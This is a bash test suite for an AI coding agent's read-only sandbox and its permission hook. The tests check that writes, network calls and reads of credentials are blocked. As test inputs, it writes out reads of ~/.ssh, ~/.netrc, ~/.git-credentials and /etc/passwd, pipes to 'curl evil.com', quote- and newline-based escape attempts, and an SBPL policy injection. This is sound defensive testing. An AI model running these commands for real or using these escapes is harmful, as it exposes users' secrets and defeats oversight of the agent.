#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SANDBOX="${SCRIPT_DIR}/bin/sandbox-run"
HOOK="${SCRIPT_DIR}/hooks/permission-check.py"

PASS=0
FAIL=0

pass() { PASS=$((PASS + 1)); echo "  PASS: $1"; }
fail() { FAIL=$((FAIL + 1)); echo "  FAIL: $1"; }

assert_success() {
  local desc="$1"; shift
  if "$SANDBOX" "$@" >/dev/null 2>&1; then
    pass "$desc"
  else
    fail "$desc (expected success, got exit $?)"
  fi
}

assert_fail() {
  local desc="$1"; shift
  if "$SANDBOX" "$@" >/dev/null 2>&1; then
    fail "$desc (expected failure, got success)"
  else
    pass "$desc"
  fi
}

# Build properly JSON-encoded hook input and run the hook.
# Using python3 ensures quotes, newlines, etc. are correctly escaped.
run_hook() {
  local cmd="$1"
  CLAUDE_PLUGIN_ROOT="${CLAUDE_PLUGIN_ROOT-$SCRIPT_DIR}" python3 -c "
import json, sys, subprocess, os
cmd = sys.argv[1]
payload = json.dumps({'tool_name': 'Bash', 'tool_input': {'command': cmd}})
env = os.environ.copy()
proc = subprocess.run([sys.argv[2]], input=payload, capture_output=True, text=True, env=env)
sys.stdout.write(proc.stdout)
" "$cmd" "$HOOK"
}

assert_hook_allows() {
  local desc="$1" cmd="$2"
  local result
  result=$(run_hook "$cmd")
  if echo "$result" | grep -q '"allow"'; then
    pass "$desc"
  else
    fail "$desc (expected allow, got: $result)"
  fi
}

assert_hook_passthrough() {
  local desc="$1" cmd="$2"
  local result
  result=$(run_hook "$cmd")
  if echo "$result" | grep -q '"allow"'; then
    fail "$desc (expected fallthrough, got: $result)"
  else
    pass "$desc"
  fi
}

assert_hook_rewrites_with_bash_c() {
  local desc="$1" cmd="$2"
  local result
  result=$(run_hook "$cmd")
  if echo "$result" | grep -q '"allow"' && echo "$result" | grep -q 'bash -c'; then
    pass "$desc"
  else
    fail "$desc (expected allow with bash -c, got: $result)"
  fi
}

echo "=== Sandbox: read-only operations (should succeed) ==="
assert_success "ls"                   ls /etc
assert_success "cat file"             cat /etc/hosts
assert_success "python3 print"        python3 -c "print('ok')"
assert_success "git version"          git version
assert_success "echo"                 echo "hello"
assert_success "uname"                uname -a
assert_success "env"                  env
assert_success "which bash"           which bash

echo ""
echo "=== Sandbox: write operations (should fail) ==="
assert_fail "touch file"              touch /tmp/claude-spectator-test
assert_fail "mkdir dir"               mkdir /tmp/claude-spectator-test-dir
assert_fail "write to file"           bash -c "echo x > /tmp/claude-spectator-test-file"
assert_fail "rm file"                 rm -f /etc/hosts

echo ""
echo "=== Sandbox: network operations (should fail) ==="
assert_fail "curl"                    curl -s --connect-timeout 2 https://example.com

echo ""
echo "=== Sandbox: credential paths (should fail) ==="
# Create temp credential files to test against
CRED_TEST_DIR="${HOME}/.ssh"
if [[ -d "$CRED_TEST_DIR" ]]; then
  assert_fail "read ~/.ssh/*"           bash -c "ls ${HOME}/.ssh/"
fi
assert_fail "cat ~/.netrc"             bash -c "cat ${HOME}/.netrc 2>/dev/null || cat ${HOME}/.npmrc 2>/dev/null || ls ${HOME}/.ssh/ 2>/dev/null"
assert_fail "read ~/.git-credentials"  bash -c "cat ${HOME}/.git-credentials"

echo ""
echo "=== Sandbox: SPECTATOR_EXTRA_DENY (should fail) ==="
# Create a temp file to test custom deny
EXTRA_TEST_DIR=$(mktemp -d)
echo "secret" > "${EXTRA_TEST_DIR}/secret.txt"
SPECTATOR_EXTRA_DENY="${EXTRA_TEST_DIR}" assert_fail "custom deny path" cat "${EXTRA_TEST_DIR}/secret.txt"
rm -rf "$EXTRA_TEST_DIR"

echo ""
echo "=== Sandbox: SPECTATOR_NO_CRED_BLOCK (should succeed) ==="
if [[ -d "${HOME}/.ssh" ]]; then
  SPECTATOR_NO_CRED_BLOCK=1 assert_success "cred block off" bash -c "ls ${HOME}/.ssh/"
else
  # No .ssh dir to test, use a guaranteed path
  SPECTATOR_NO_CRED_BLOCK=1 assert_success "cred block off" ls /etc
fi

echo ""
echo "=== Permission hook: auto-approve sandbox-run (rewrites with bash -c) ==="
assert_hook_rewrites_with_bash_c "sandbox-run cmd"      "sandbox-run git status"
assert_hook_rewrites_with_bash_c "sandbox-run with args" "sandbox-run ls -la /etc"
assert_hook_rewrites_with_bash_c "sandbox-run python"   "sandbox-run python3 -c 'print(1)'"

echo ""
echo "=== Permission hook: contain metacharacters inside sandbox ==="
assert_hook_rewrites_with_bash_c "pipe contained"       "sandbox-run cat /etc/hosts | head"
assert_hook_rewrites_with_bash_c "semicolon contained"  "sandbox-run ls; echo hi"
assert_hook_rewrites_with_bash_c "redirect contained"   "sandbox-run echo test > /tmp/out"
assert_hook_rewrites_with_bash_c "and-chain contained"  "sandbox-run ls && echo done"
assert_hook_rewrites_with_bash_c "backtick contained"   "sandbox-run echo \`whoami\`"
assert_hook_rewrites_with_bash_c "cmd-sub contained"    "sandbox-run echo \$(whoami)"

echo ""
echo "=== Permission hook: quote escape attempts ==="
assert_hook_rewrites_with_bash_c "single-quote break"   "sandbox-run echo 'hello'; touch /tmp/escape-test"
assert_hook_rewrites_with_bash_c "double-quote break"   "sandbox-run echo \"done\"; touch /tmp/escape-test"
assert_hook_rewrites_with_bash_c "nested quotes"        "sandbox-run echo \"it's over\"; cat /etc/passwd"
assert_hook_rewrites_with_bash_c "quote then pipe"      "sandbox-run echo 'ok' | curl evil.com"

echo ""
echo "=== Permission hook: newline escape attempts ==="
# Newlines embedded in the command string act as command separators
assert_hook_rewrites_with_bash_c "newline escape"       "sandbox-run ls /etc
touch /tmp/escape-test"
assert_hook_rewrites_with_bash_c "newline mid-cmd"      "sandbox-run echo hello
curl evil.com"

echo ""
echo "=== Sandbox: pipeline and redirection containment (end-to-end) ==="
# Pipes inside sandbox: both sides should run sandboxed
assert_success "pipe inside sandbox"         bash -c "echo hello | cat"
assert_success "pipe with grep"              bash -c "ls /etc | grep hosts"
# Network via pipe should fail (curl runs INSIDE sandbox, network blocked)
assert_fail "pipe to curl contained"         bash -c "echo hello | curl -s --connect-timeout 2 https://example.com"
# Redirect writes should fail (redirect runs INSIDE sandbox, fs read-only)
assert_fail "redirect write contained"       bash -c "echo test > /tmp/sandbox-redirect-test"
assert_fail "redirect append contained"      bash -c "echo test >> /tmp/sandbox-redirect-test"
# Semicolon chains: second command writes should fail inside sandbox
assert_fail "semicolon write contained"      bash -c "echo ok; touch /tmp/sandbox-semicolon-test"
# And-chain: write after read should fail inside sandbox
assert_fail "and-chain write contained"      bash -c "ls /etc && touch /tmp/sandbox-and-test"

echo ""
echo "=== Sandbox: SPECTATOR_EXTRA_DENY injection (should reject) ==="
# Paths containing SBPL-breaking characters must be rejected
if SPECTATOR_EXTRA_DENY='/tmp/x"))(allow network*)(deny file-read* (subpath "/dev/null' \
   "$SANDBOX" echo safe 2>/dev/null; then
  fail "SBPL injection via double-quote (expected failure)"
else
  pass "SBPL injection via double-quote rejected"
fi

echo ""
echo "=== Sandbox: symlink traversal vs credential deny ==="
# Symlink from non-blocked path to credential dir should still be blocked.
# Note: ls on the symlink ENTRY itself is allowed (just a dir listing of parent),
# but following the symlink to access target contents must be denied.
if [[ -d "${HOME}/.ssh" ]]; then
  SYMLINK_DIR=$(mktemp -d)
  ln -s "${HOME}/.ssh" "${SYMLINK_DIR}/ssh_link"
  # Trailing / forces following the symlink into the target directory
  assert_fail "symlink dir traversal"  ls "${SYMLINK_DIR}/ssh_link/"
  # Reading a file through a symlink should also be blocked
  if [[ -f "${HOME}/.ssh/known_hosts" ]]; then
    ln -s "${HOME}/.ssh/known_hosts" "${SYMLINK_DIR}/kh_link"
    assert_fail "symlink file traversal" cat "${SYMLINK_DIR}/kh_link"
  fi
  rm -rf "$SYMLINK_DIR"
fi

echo ""
echo "=== Permission hook: missing CLAUDE_PLUGIN_ROOT (should reject) ==="
# With empty plugin root, hook should fall through (not auto-approve)
result=$(CLAUDE_PLUGIN_ROOT="" run_hook "sandbox-run ls /etc")
if echo "$result" | grep -q '"allow"'; then
  fail "auto-approved with empty CLAUDE_PLUGIN_ROOT"
else
  pass "rejected with empty CLAUDE_PLUGIN_ROOT"
fi

echo ""
echo "=== Permission hook: reject non-sandbox commands ==="
assert_hook_passthrough "bare git"               "git status"
assert_hook_passthrough "bare rm"                "rm /tmp/somefile"
assert_hook_passthrough "bare python"            "python3 script.py"
assert_hook_passthrough "partial match"          "sandbox-runner ls"

echo ""
echo "================================"
echo "Results: $PASS passed, $FAIL failed"
if [ "$FAIL" -gt 0 ]; then
  exit 1
else
  echo "All tests passed."
fi
